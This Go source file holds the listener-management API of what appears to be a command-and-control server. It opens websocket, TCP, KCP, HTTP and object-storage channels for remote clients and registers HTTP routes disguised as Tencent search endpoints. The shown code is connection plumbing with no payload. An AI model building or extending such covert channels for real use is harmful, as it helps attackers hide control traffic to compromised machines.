package api

import (
	"BackendTemplate/pkg/api/communication"
	"BackendTemplate/pkg/connection"
	k "BackendTemplate/pkg/connection/kcp"
	"BackendTemplate/pkg/connection/oss"
	"BackendTemplate/pkg/connection/tcp"
	"BackendTemplate/pkg/connection/websocket"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/logger"
	"github.com/gin-gonic/gin"
	"github.com/xtaci/kcp-go/v5"
	"log"
	"net"
	"net/http"
	"strings"
	"time"
)

func AddListener(c *gin.Context) {
	var listener struct {
		Type           string `json:"type"`
		ListenAddress  string `json:"listenAddress"`
		ConnectAddress string `json:"connectAddress"`
	}
	if err := c.BindJSON(&listener); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if exists, _ := database.Engine.Where("listen_address LIKE ?", "%"+listener.ListenAddress).Exist(&database.Listener{}); exists {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener already exists"})
		return
	}
	ports := strings.Split(listener.ListenAddress, ":")
	var port string
	if len(ports) == 2 {
		port = ports[1]
	} else if len(ports) == 1 {
		port = ports[0]
	}
	inUse, err := isPortInUse(port)
	if err != nil {
		logger.Error("检测端口 %s 时发生错误: %v\n", port, err)
	}
	if inUse {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": port + "端口被占用"})
		return
	}
	database.Engine.Insert(&database.Listener{Type: listener.Type, ListenAddress: listener.ListenAddress, ConnectAddress: listener.ConnectAddress, Status: 1})
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener added"})
	go handleOpenPort(listener.Type, listener.ListenAddress)
}
func ListListener(c *gin.Context) {
	var listeners []database.Listener
	database.Engine.Find(&listeners)
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": listeners})
}
func OpenListener(c *gin.Context) {
	var listener struct {
		ListenAddress string `json:"listenAddress"`
	}
	if err := c.BindJSON(&listener); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	var lis database.Listener
	database.Engine.Where("listen_address = ?", listener.ListenAddress).Get(&lis)
	ports := strings.Split(listener.ListenAddress, ":")
	var port string
	if len(ports) == 2 {
		port = ports[1]
	} else if len(ports) == 1 {
		port = ports[0]
	}
	inUse, err := isPortInUse(port)
	if err != nil {
		logger.Error("检测端口 %s 时发生错误: %v\n", port, err)
	}
	if inUse {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": port + "端口被占用"})
		return
	}
	if lis.Status == 2 {
		go handleOpenPort(lis.Type, listener.ListenAddress)
		database.Engine.Where("listen_address = ?", listener.ListenAddress).Update(&database.Listener{Status: 1})
		c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener opened"})
	} else {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener already opened"})
	}

}
func CloseListener(c *gin.Context) {
	var listener struct {
		ListenAddress string `json:"listenAddress"`
	}
	if err := c.BindJSON(&listener); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	var lis database.Listener
	database.Engine.Where("listen_address = ?", listener.ListenAddress).Get(&lis)
	if lis.Status == 1 {
		database.Engine.Where("listen_address = ?", listener.ListenAddress).Update(&database.Listener{Status: 2})
		handleClosePort(lis.Type, lis.ListenAddress, c)
		c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener closed"})
	} else {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener already closed"})
	}

}
func DeleteListener(c *gin.Context) {
	var listener struct {
		ListenAddress string `json:"listenAddress"`
	}
	if err := c.BindJSON(&listener); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	var lis database.Listener
	database.Engine.Where("listen_address = ?", listener.ListenAddress).Get(&lis)
	if lis.Status == 1 {
		handleClosePort(lis.Type, lis.ListenAddress, c)
	}
	database.Engine.Where("listen_address = ?", listener.ListenAddress).Delete(&database.Listener{})
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": "Listener deleted"})
}
func handleOpenPort(listenerType string, listenerAddress string) {
	switch listenerType {
	case "websocket":
		mux := http.NewServeMux()
		mux.HandleFunc("/ws", websocket.HandleWebSocket)

		server := &http.Server{
			Addr:           listenerAddress, // 确保listener.ListenAddress包含了端口号，如":8080"
			Handler:        mux,
			ReadTimeout:    15 * time.Second,
			WriteTimeout:   15 * time.Second,
			MaxHeaderBytes: 1 << 20,
		}
		connection.MuClientListenerType.Lock()
		connection.HttpServer[listenerAddress] = server
		connection.MuClientListenerType.Unlock()
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logger.Error("listen: %s\n", err)
			return
		}

	case "tcp":
		tcpListener, err := net.Listen("tcp", listenerAddress)
		if err != nil {
			logger.Error("Error listening:", err)
			return
		}
		connection.MuClientListenerType.Lock()
		connection.TCPServer[listenerAddress] = tcpListener
		connection.MuClientListenerType.Unlock()
		logger.Info("Listening on:", listenerAddress)

		for {
			conn, err := tcpListener.Accept()
			if err != nil {
				logger.Error("Error accepting connection:", err)
				break
			}

			go tcp.HandleTcpConnection(conn)
		}
	case "kcp":
		lis, err := kcp.ListenWithOptions(listenerAddress, nil, 10, 3)
		if err != nil {
			log.Fatal(err)
		}
		logger.Error("Server listening on", listenerAddress)
		connection.MuClientListenerType.Lock()
		connection.KCPServer[listenerAddress] = lis
		connection.MuClientListenerType.Unlock()
		// 循环等待客户端连接
		for {
			conn, err := lis.AcceptKCP()
			if err != nil {
				logger.Error("Accept error:", err)
				break
			}
			logger.Error("Client connected:", conn.RemoteAddr())

			// 处理客户端连接
			go k.HandleKCPConnection(conn)
		}
	case "http":
		mux := http.NewServeMux()
		mux.HandleFunc("/tencent/mcp/pc/pcsearch", communication.GetHttp)
		mux.HandleFunc("/tencent/sensearch/collection/item/check", communication.PostHttp)

		server := &http.Server{
			Addr:    listenerAddress,
			Handler: mux,
		}

		// 存储服务器实例
		connection.MuClientListenerType.Lock()
		connection.HttpServer[listenerAddress] = server
		connection.MuClientListenerType.Unlock()

		// 启动服务器（非阻塞）
		go func() {
			if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				logger.Error(err.Error())
			}
		}()
	case "oss":
		tmp := strings.Split(listenerAddress, ":")
		connection.MuClientListenerType.Lock()
		connection.StopChan[listenerAddress] = make(chan bool)
		connection.MuClientListenerType.Unlock()
		go oss.HandleOSSConnection(tmp[0], tmp[1], tmp[2], tmp[3])
	}
}
func handleClosePort(listenerType string, listenerAddress string, c *gin.Context) {
	switch listenerType {
	case "websocket":
		err := connection.HttpServer[listenerAddress].Close()
		connection.MuClientListenerType.Lock()
		delete(connection.HttpServer, listenerAddress)
		connection.MuClientListenerType.Unlock()
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener closed failed"})
			return
		}
	case "tcp":
		err := connection.TCPServer[listenerAddress].Close()
		connection.MuClientListenerType.Lock()
		delete(connection.TCPServer, listenerAddress)
		connection.MuClientListenerType.Unlock()
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener closed failed"})
			return
		}
	case "kcp":
		err := connection.KCPServer[listenerAddress].Close()
		connection.MuClientListenerType.Lock()
		delete(connection.KCPServer, listenerAddress)
		connection.MuClientListenerType.Unlock()
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener closed failed"})
			return
		}
	case "http":
		err := connection.HttpServer[listenerAddress].Close()
		connection.MuClientListenerType.Lock()
		delete(connection.HttpServer, listenerAddress)
		connection.MuClientListenerType.Unlock()
		if err != nil {
			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Listener closed failed"})
			return
		}
	case "oss":
		connection.StopChan[listenerAddress] <- true
		connection.MuClientListenerType.Lock()
		delete(connection.StopChan, listenerAddress)
		connection.MuClientListenerType.Unlock()
	}
}
